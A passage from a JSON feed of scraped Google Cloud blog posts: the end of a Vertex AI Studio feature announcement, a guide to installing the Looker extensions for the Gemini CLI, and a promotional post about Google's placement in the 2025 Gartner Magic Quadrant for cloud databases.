1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">/Prompt</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Optimize prompt and system Instructions</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Automatically refines your prompt and/or system instructions for better results</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">/Evaluate</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Evaluate prompts</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Uses custom autoraters for objective quality assessment.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">/Build</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Application development and structuring</span></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Enables rapid app building from a simple prompt and allows for continuous iteration. Use prompts or agents to define your application's specifications.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p><strong style=\"vertical-align: baseline;\">Prompt</strong><strong style=\"vertical-align: baseline;\"> Agent: Optimize and evaluate for production</strong></p>\n<p><span style=\"vertical-align: baseline;\">The guessing game of prompt engineering is over. Instead of the classic trial-and-error loop, the prompt agent helps you collaborate with AI to instantly achieve perfect results with prompt generation and refinement.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_I0SePYc.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Use the </span><strong style=\"vertical-align: baseline;\">/Evaluate</strong><span style=\"vertical-align: baseline;\"> command to evaluate your prompt. You can use an autorater to assess the quality of each response, and you can even create your own grading rubric for AI to assess.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_OLCzlmy.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">Build</strong><strong style=\"vertical-align: baseline;\"> agent: Rapid application development</strong></p>\n<p><span style=\"vertical-align: baseline;\">Once your optimized prompt is ready and validated, the </span><strong style=\"vertical-align: baseline;\">/Build</strong><span style=\"vertical-align: baseline;\"> command and other tools turn your work into code immediately:</span></p>\n<p><span style=\"vertical-align: baseline;\">One-click code generation: With your key logic finalized, instantly click \"Get Code\" to generate an application that can be downloaded or shared with others to accelerate “buy-in”. </span><span style=\"vertical-align: baseline;\">GitHub integrations and push-to-Cloud Run coming soon.</span></p>\n<p><span style=\"vertical-align: baseline;\">Use your prompts: Directly embed your optimized prompt within the working application</span></p>\n<p><span style=\"vertical-align: baseline;\">Use a custom agent to power your app: Seamlessly scale your work. Create an agent with Vertex AI Agent Builder, then reference it in your application. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">2. Collaboration tools to help you work more efficiently</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Generative AI development is rarely a solo task. The new collaboration features ensure your entire team, and even external stakeholders, can work together seamlessly in a secure enterprise environment:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Share prompts with non-GCP users:</strong><span style=\"vertical-align: baseline;\"> Extend collaboration beyond your cloud environment by easily sharing your best prompts with anyone.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Access saved prompts across Google’s ecosystem</strong><span style=\"vertical-align: baseline;\">: Gemini CLI, Gemini Enterprise, Vertex SDK.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Share notes about updates:</strong><span style=\"vertical-align: baseline;\"> Keep your team aligned with integrated note-sharing features to document changes and insights.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">See version history to track changes over time:</strong><span style=\"vertical-align: baseline;\"> Maintain control and transparency by tracking all revisions to your prompts and configurations.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">3. Get started more quickly </strong></h3>\n<p><span style=\"vertical-align: baseline;\">We've streamlined the onboarding and initial setup experience:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">One-click API key:</strong><span style=\"vertical-align: baseline;\"> Get instant access to the APIs you need without complex configuration.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Ask questions directly to the </strong><strong style=\"vertical-align: baseline;\">/Ask</strong><strong style=\"vertical-align: baseline;\"> agent:</strong><span style=\"vertical-align: baseline;\"> Find answers fast with an integrated help agent, designed to provide immediate guidance.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Start with express mode:</strong><span style=\"vertical-align: baseline;\"> Jump straight into building with a simplified, default view that minimizes setup time.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Try models for free:</strong><span style=\"vertical-align: baseline;\"> Loginless access with no email login required.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Get access to the latest Google models</strong><span style=\"vertical-align: baseline;\">: Gemini 3, Nano Banana Pro, Imagen, Veo, Lyria, Chirp and more.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"4\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/4_Xa8f9B0.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">We're committed to continually refining Vertex AI Studio based on</span><span style=\"font-style: italic; vertical-align: baseline;\"> your </span><span style=\"vertical-align: baseline;\">feedback, which you can share right in the console, ensuring you have the tools you need for building the next generation of AI applications.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://pantheon.corp.google.com/vertex-ai/tutorials?e=VertexAiAgentEnginePhase2Launch::VertexAiAgentEnginePhase2Control,VertexAiStudioAutopushConfigOverrideLaunch::VertexAiStudioAutopushConfigOverrideControl&amp;mods=disable_console_nav_discovery,enable_router_tracing,force_hide_emergency_banner,hide_section_nav,integration_test,-is_integration_test,mfa_conformance_service_force_state_passed&amp;project=cloud-llm-preview1\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Try a tutorial</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li><a href=\"https://console.cloud.google.com/vertex-ai/studio/multimodal\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Explore the new Vertex AI Studio</strong></a><strong style=\"vertical-align: baseline;\"> via </strong><strong style=\"font-style: italic; vertical-align: baseline;\">vertexai.google</strong><strong style=\"vertical-align: baseline;\"> and see how these feature and usability improvements can accelerate your development.</strong></li>\n</ul></div>",
        "published_date": "2025-11-21 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/business-intelligence/gemini-cli-adds-looker-extensions/",
        "title": "Looker and Looker Conversational Analytics extensions available in the Gemini CLI",
        "thumbnail": null,
        "author": "Mike DeAngelo",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The ability to easily access and understand data is essential for modern businesses. The </span><a href=\"https://cloud.google.com/gemini/docs/codeassist/gemini-cli\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini command line interface (CLI)</span></a><span style=\"vertical-align: baseline;\"> is an open-source AI agent that provides access to Gemini directly in your terminal, enabling you to interact with Google’s latest AI models directly from the interface you know best. With the release of </span><a href=\"https://github.com/gemini-cli-extensions/looker\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Looker</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://github.com/gemini-cli-extensions/looker-conversational-analytics\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Looker Conversational Analytics</span></a><span style=\"vertical-align: baseline;\"> extensions, available now, you can interact with your Looker data and dashboards from the command line, streamlining your workflows and making data more accessible.</span></p>\n<p><span style=\"vertical-align: baseline;\">These new extensions for the Gemini CLI simplify your ability to ask complex questions of your data, generate insightful reports, and create new dashboards without leaving your terminal, opening up new possibilities for data exploration and analysis from the applications you use every day.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Getting started</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Getting started with the new Looker extensions for the Gemini CLI is straightforward. Here’s how you install and configure them:</span></p>\n<p><strong style=\"vertical-align: baseline;\">1. Install the Gemini CLI:</strong></p>\n<p><span style=\"vertical-align: baseline;\">If you haven't already, you'll need to install the Gemini CLI. You can do so via npm:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;npm install -g @google/gemini-cli&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f14290c3250&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">2. Install the Looker extension:</strong></p>\n<p><span style=\"vertical-align: baseline;\">To install the Looker extension, use the following command:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;gemini extensions install \\r\\nhttps://github.com/gemini-cli-extensions/looker&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f14290c37f0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">3. Install the Looker Conversational Analytics extension:</strong></p>\n<p><span style=\"vertical-align: baseline;\">To install the Looker Conversational Analytics extension, use this command:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;gemini extensions install \\r\\nhttps://github.com/gemini-cli-extensions/looker-conversational-analytics&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f14290c3550&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><strong style=\"vertical-align: baseline;\">4. Configure Your Looker connection:</strong></p>\n<p><span><span style=\"vertical-align: baseline;\">After installation, you’ll need to configure the extensions to connect to your Looker instance. You’ll need a Looker Client ID and Client Secret, which can be obtained by following the instructions in the </span><a href=\"https://docs.cloud.google.com/looker/docs/api-auth\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Looker API authentication documentation</span></a><span style=\"vertical-align: baseline;\">. If you don't have access to the Admin pages of the Looker system, ask your administrator to get the ID and Secret for you.</span></span></p>\n<p><span style=\"vertical-align: baseline;\">Then set the following environment variables before starting the Gemini CLI. These variables can also be loaded from a </span><code style=\"vertical-align: baseline;\">.env</code><span style=\"vertical-align: baseline;\"> file.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">LOOKER_BASE_URL</code><span style=\"vertical-align: baseline;\">: The base URL of your Looker instance (e.g., </span><code style=\"vertical-align: baseline;\">https://looker.example.com</code><span style=\"vertical-align: baseline;\">). In some cases, you may need to add </span><code style=\"vertical-align: baseline;\">:19999</code><span style=\"vertical-align: baseline;\"> to the URL.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">LOOKER_CLIENT_ID</code><span style=\"vertical-align: baseline;\">: The Looker API client ID</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">LOOKER_CLIENT_SECRET</code><span style=\"vertical-align: baseline;\">: The Looker API client secret</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">LOOKER_VERIFY_SSL</code><span style=\"vertical-align: baseline;\">: (Optional) Whether to verify SSL certificates. Defaults to </span><code style=\"vertical-align: baseline;\">true</code></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">For looker-conversational-analytics, you also need to provide application default credentials with the correct roles as well as a GCP project with the proper APIs enabled. See </span><a href=\"https://googleapis.github.io/genai-toolbox/resources/sources/looker/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">https://googleapis.github.io/genai-toolbox/resources/sources/looker/</span></a><span style=\"vertical-align: baseline;\"> for all the details. In addition, you need to define these environment variables:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">LOOKER_PROJECT</code><span style=\"vertical-align: baseline;\">: The Google Cloud Project to use</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><code style=\"vertical-align: baseline;\">LOOKER_LOCATION</code><span style=\"vertical-align: baseline;\">: The Google Cloud Location to use, such as </span><code style=\"vertical-align: baseline;\">us</code></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Dive deeper</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The release of these new extensions is a valuable milestone in our efforts to bring the full benefits of Gemini and Looker together for you. To help you get the most out of these new extensions, we've prepared relevant documentation within MCP Toolbox. These resources provide detailed information on all the available tools and functionality.</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://googleapis.github.io/genai-toolbox/resources/tools/looker/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Looker Tools documentation</strong></a></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://googleapis.github.io/genai-toolbox/resources/tools/looker-conversational-analytics/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Looker Conversational Analytics documentation</strong></a></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">We welcome your feedback as we continue to innovate. </span><a href=\"https://github.com/google-gemini/gemini-cli\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Get started today</span></a><span style=\"vertical-align: baseline;\"> and unlock the full potential of your data.</span></p></div>",
        "published_date": "2025-11-21 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/a-leader-in-2025-gartner-magic-quadrant-for-cdbms/",
        "title": "Google is a Leader in the 2025 Gartner® Magic Quadrant for Cloud Database Management Systems",
        "thumbnail": null,
        "author": "Yasmeen Ahmad",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Google is a Leader in the 2025 Gartner Magic Quadrant for Cloud Database Management Systems for the sixth year in a row, and for the third consecutive year is positioned furthest in vision. </span></p>\n<p><span style=\"vertical-align: baseline;\">This comes as we cross into the era of agentic AI. Leading enterprises are in the early days of deploying agents to automate core business functions. At the center is data, the fuel for AI. This recognition from Gartner — especially our placement for Completeness of Vision — in our opinion validates our long-standing belief that the future of enterprise data is unified, open, and inseparable from the AI layer. This is the blueprint for what we call the AI-native Data Cloud.</span></p>\n<p><span style=\"vertical-align: baseline;\">The AI-native Data Cloud is the only architecture engineered from the ground up to eliminate the complexity and hidden cost of the agentic era. Those who learn to apply the power of agents today will be the winning businesses of tomorrow. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2025 Gartner Magic Quadrant for Cloud Database Management Systems\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2025_Gartner_Magic_Quadrant_for_Cloud_Data.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><strong style=\"vertical-align: baseline;\">A data and AI foundation for the agentic enterprise</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Your organization’s ability to take advantage of AI will depend on your enterprise data strategy. Agents require a new data foundation that combines analytical platforms for their rich historical petabytes of data with high-performance transactional databases for real-time actions. Agents need to be firmly grounded in governed, enterprise data so that they can generate trustworthy output. Siloed, fragmented data stacks struggle to offer these capabilities. </span></p>\n<p><span style=\"vertical-align: baseline;\">Google’s Data Cloud is anchored by the integration of BigQuery as the analytical engine, databases such as Spanner and AlloyDB for operational processing, Looker for business intelligence, and Dataplex Universal Catalog for data management and governance.</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">It is designed with a single, unified vision where operational, analytical, and AI systems co-process as one native fabric. With AI infused in every layer, the platform automates tasks across the entire data lifecycle. Grounded in business context and enterprise data, it delivers trusted intelligence at scale. This active foundation continuously adapts with real-time intelligence, empowering teams to build next-generation intelligent applications and agentic experiences, while minimizing complexity.</span></p>\n<p><span style=\"vertical-align: baseline;\">Let's review three benefits enterprises realize when they operate on a unified, AI-native Data Cloud, along with our latest innovations to help you thrive in the agentic era.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Accelerate time to market with autonomous design </strong></h3>\n<p><span style=\"vertical-align: baseline;\">To move quickly in the agentic era, your organization must remove manual processes that separate data from AI-driven actions. Our AI-native Data Cloud brings the power of AI directly to your data to fuel autonomous, agentic systems. This is timely, as customers are increasingly shifting to AI-driven workflows, as evidenced by a 27x increase in the volume of data processed in BigQuery with Gemini. </span></p>\n<p><span style=\"vertical-align: baseline;\">We are delivering on this vision by embedding a set of specialized agents directly into the platform. We provide a specialized, autonomous data agent for every kind of data user — from data scientists and engineers to business analysts. These include the </span><a href=\"https://docs.cloud.google.com/bigquery/docs/data-engineering-agent-pipelines?_gl=1*19up8uw*_up*MQ..&amp;gclid=CjwKCAiAw9vIBhBBEiwAraSATjnKEzSxIxIA3gdMo84fHzltyc6oiof7K4Ab8dO-DZ_D_kfULZ4n7BoCT1cQAvD_BwE&amp;gclsrc=aw.ds\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Data Engineering Agent</span></a><span style=\"vertical-align: baseline;\"> to automate complex pipelines, the </span><a href=\"https://docs.cloud.google.com/bigquery/docs/colab-data-science-agent?_gl=1*19up8uw*_up*MQ..&amp;gclid=CjwKCAiAw9vIBhBBEiwAraSATjnKEzSxIxIA3gdMo84fHzltyc6oiof7K4Ab8dO-DZ_D_kfULZ4n7BoCT1cQAvD_BwE&amp;gclsrc=aw.ds\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Data Science Agent</span></a><span style=\"vertical-align: baseline;\"> to execute ML modeling without manual setup, and the </span><a href=\"https://cloud.google.com/blog/products/business-intelligence/looker-conversational-analytics-now-ga?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Conversational Analytics Agent</span></a><span style=\"vertical-align: baseline;\"> to empower any user in your organization to get answers using natural language. These agents form a collaborative AI agent network that can power end-to-end data workflows.</span></p>\n<p><span style=\"vertical-align: baseline;\">Your developers also have the tools they need to build agents tailored to your specific business processes, for example, the new Data Agents API and </span><a href=\"https://developers.googleblog.com/en/agent-development-kit-easy-to-build-multi-agent-applications/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Development Kit (ADK)</span></a><span style=\"vertical-align: baseline;\">. </span><a href=\"https://cloud.google.com/blog/products/databases/gemini-cli-extensions-for-google-data-cloud\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini CLI extensions</span></a><span style=\"vertical-align: baseline;\"> allow data teams to use natural language for complex analysis, and </span><a href=\"https://google.github.io/adk-docs/tools/google-cloud/bigquery-agent-analytics/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Analytics in BigQuery</span></a><span style=\"vertical-align: baseline;\">, built using ADK, lets you capture, analyze, and visualize agent performance, user interaction, and their associated costs.</span></p>\n<p><span style=\"vertical-align: baseline;\">These capabilities deliver business results. </span><a href=\"https://www.youtube.com/watch?v=YFi8mgQeNaU\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Lowe's</span></a><span style=\"vertical-align: baseline;\"> implemented an AI-first strategy on Google’s Data Cloud for their e-commerce site and mobile application to improve product discovery for customers who shop with a visual preference. Now customers can now find visually similar products, resulting in more than $15 million in incremental annualized revenue for home decor items and increased sales conversion rates. </span></p>\n<h3><strong style=\"vertical-align: baseline;\">Control operational costs on a single governed foundation</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Data fragmentation can contribute to high AI costs. Google’s Data Cloud is an integrated platform that connects all your operational and analytical workloads, including easy integration with Vertex AI, our platform for building AI models and agents. This minimizes redundant data movement and storage and creates a more efficient economic model. In fact, according to our analysis, it can be eight to 16 times more cost-efficient to run data and AI workloads on the single BigQuery and Vertex AI platform rather than on separate, disconnected systems.</span></p>\n<p><span style=\"vertical-align: baseline;\">In the age of agents, trust and compliance are paramount. Disconnected data and AI have the potential for significant governance risk: the threat of data leakage, agent hallucinations, biased outcomes, and regulatory non-compliance. Effective governance helps ensure these agents’ integrity. At the same time, the platform's governance and knowledge engine creates an active AI catalog across your cloud estate, providing you with a deep understanding of your data environment. AI agents can use this catalog to identify the correct datasets to use with over 50% greater accuracy than traditional methods, reducing errors and improving trust.</span></p>\n<p><span style=\"vertical-align: baseline;\">We continue to deliver new features that reinforce this foundation. For instance, with AI, context is everything, but providing that context can be complicated when you’re training agents on multimodal data such as text, video, and images. To help, we’ve unified a full range of AI capabilities within BigQuery. Whether you want to build machine learning models, process massive amounts of unstructured data with generative AI, or build retrieval augmented generation (RAG) applications using vector embeddings and </span><a href=\"https://cloud.google.com/bigquery/docs/vector-search-intro\"><span style=\"text-decoration: underline; vertical-align: baseline;\">hybrid search</span></a><span style=\"vertical-align: baseline;\">, you can now do it directly where your data lives. </span><a href=\"https://docs.cloud.google.com/spanner/docs/graph/perform-vector-similarity-search\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Spanner’s vector search</span></a><span style=\"vertical-align: baseline;\">, meanwhile, ties together complex multimodal queries, letting your teams consolidate full text search, graph, and vector workloads onto a single system.</span></p>\n<p><span style=\"vertical-align: baseline;\">At the same time, autonomous, mission-critical applications such as ones that rely on real-time financial transactions or perform global inventory updates need to be built on a proven database. </span><a href=\"https://cloud.google.com/blog/products/databases/spanners-columnar-engine-unites-oltp-and-analytics\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Spanner’s new columnar engine</span></a><span style=\"vertical-align: baseline;\"> unifies transactional and analytical processing, with analytical queries running up to 200x faster on live operational data.</span></p>\n<p><span style=\"vertical-align: baseline;\">Google (Spanner) ranked in the highest three across all use cases in the 2025 Gartner Critical Capabilities for Operational Cloud DBMS report, including #1 in Lightweight Transactions. And Google (BigQuery) ranked #1 for the Event Analytics use case in the 2025 Gartner Critical Capabilities for Analytical Cloud DBMS report, which in our opinion underscores our ability to deliver the real-time data processing required for high-performance, autonomous systems. </span></p>\n<p><span style=\"vertical-align: baseline;\">You can see the strategic advantage of a unified, governed foundation in </span><a href=\"https://www.youtube.com/watch?v=f6pF94fvpb8\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Banco BV's</span></a><span style=\"vertical-align: baseline;\"> modernization effort. The company migrated from Databricks to Google Cloud to enhance governance, scale their data infrastructure, and meet increasing customer demands, all while strictly managing security. By migrating, centralizing data management, and accelerating AI model testing, they aim to improve business output by 100%.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Future-proof your architecture with an open platform</strong></h3>\n<p><span style=\"vertical-align: baseline;\">To ensure their long-term viability and prevent vendor lock-in, your AI investments need a foundation built on open standards. An open platform gives your teams the flexibility to modernize your data ecosystem and build AI-powered systems that can process data across any cloud environment. This approach resolves the trade-off between the flexibility of a data lake and the performance of a data warehouse.</span></p>\n<p><span style=\"vertical-align: baseline;\">We deliver on the promise of open platform innovation by prioritizing speed, security, and flexibility. </span><a href=\"https://cloud.google.com/products/alloydb\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB</span></a><span style=\"vertical-align: baseline;\"> is more than four times faster for transactional workloads and provides up to two times better price-performance compared to self-managed PostgreSQL. Plus, you can run it anywhere with AlloyDB Omni, enabling multi and hybrid cloud environments. For your critical Spark workloads, we deliver high performance with </span><a href=\"https://cloud.google.com/blog/products/data-analytics/introducing-lightning-engine-for-apache-spark\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Lightning Engine for Apache Spark</span></a><span style=\"vertical-align: baseline;\">, now generally available. This engine improves Spark performance by more than four times compared to open-source Spark and it delivers 10% faster query execution than Databricks Photon.</span></p>\n<p><span style=\"vertical-align: baseline;\">Then, to future-proof your data estate, we keep everything accessible and interoperable through </span><a href=\"https://cloud.google.com/biglake?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigLake</span></a><span style=\"vertical-align: baseline;\">, our management layer that acts as a unifying fabric for your open data. Our support for open formats, including the recent general availability of the Apache Iceberg REST Catalog, helps your data stay accessible and ready for your future needs.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our commitment to open innovation is shown by </span><a href=\"https://cloud.google.com/blog/topics/customers/engineering-deutsche-telekoms-sovereign-data-platform?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Deutsche Telekom</span></a><span style=\"vertical-align: baseline;\">, who modernized over 40 legacy data systems into a \"One Data Ecosystem\" on Google Cloud to meet stringent German data sovereignty regulations. By using Sovereign Cloud and Apache Iceberg as the core open platform, they established a unified, compliant architecture that provides a single source of truth across services like BigQuery and Spanner, resulting in a 22x performance boost for a key use case.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">What’s next?</strong></h3>\n<p><span style=\"vertical-align: baseline;\">To learn more about our placement and how we think we can accelerate your data journey, download the complimentary </span><a href=\"https://cloud.google.com/resources/content/gartner-dbms-mq-report\"><span style=\"text-decoration: underline; vertical-align: baseline;\">2025 Gartner Magic Quadrant for Cloud Database Management Systems report</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<hr />\n<p><sup><em><span style=\"vertical-align: baseline;\">Gartner, Magic Quadrant for Cloud Database Management Systems, Henry Cook, Xingyu Gu, Ramke Ramakrishnan, Aaron Rosenbaum, Masud Miraz, November 18, 2025</span></em></sup></p>\n<p><sup><em><span style=\"vertical-align: baseline;\">Gartner, Critical Capabilities for Cloud Database Management Systems for Operational Use Cases, Ramke Ramakrishnan, Masud Miraz, Xingyu Gu, Henry Cook, Aaron Rosenbaum, November 19, 2025</span></em></sup></p>\n<p><sup><em><span style=\"vertical-align: baseline;\">Gartner, Critical Capabilities for Cloud Database Management Systems for Analytical Use Cases, Aaron Rosenbaum, Ramke Ramakrishnan, Henry Cook, Xingyu Gu, Masud Miraz, November 19, 2025</span></em></sup></p>\n<p><sup><em><span style=\"vertical-align: baseline;\">Gartner does not endorse any vendor, product or service depicted in its research publications and does not advise technology users to select only those vendors with the highest ratings or other designation. Gartner research publications consist of the opinions of Gartner’s Research &amp; Advisory organization and should not be construed as statements of fact. Gartner disclaims all warranties, expressed or implied, with respect to this research, including any warranties of merchantability or fitness for a particular purpose.</span></em></sup></p>\n<p><sup><em><span style=\"vertical-align: baseline;\">GARTNER is a registered trademark and service mark of Gartner, Inc. and/or its affiliates in the U.S. and internationally, and MAGIC QUADRANT is a registered trademark of Gartner, Inc. and/or its affiliates and are used herein with permission. All rights reserved.</span></em></sup></p>\n<p><sup><em><span style=\"vertical-align: baseline;\">This graphic was published by Gartner, Inc. as part of a larger research document and should be evaluated in the context of the entire document. The Gartner document is available upon request from Google. </span></em></sup></p></div>",
        "published_date": "2025-11-21 17:00:00"
    },
    {
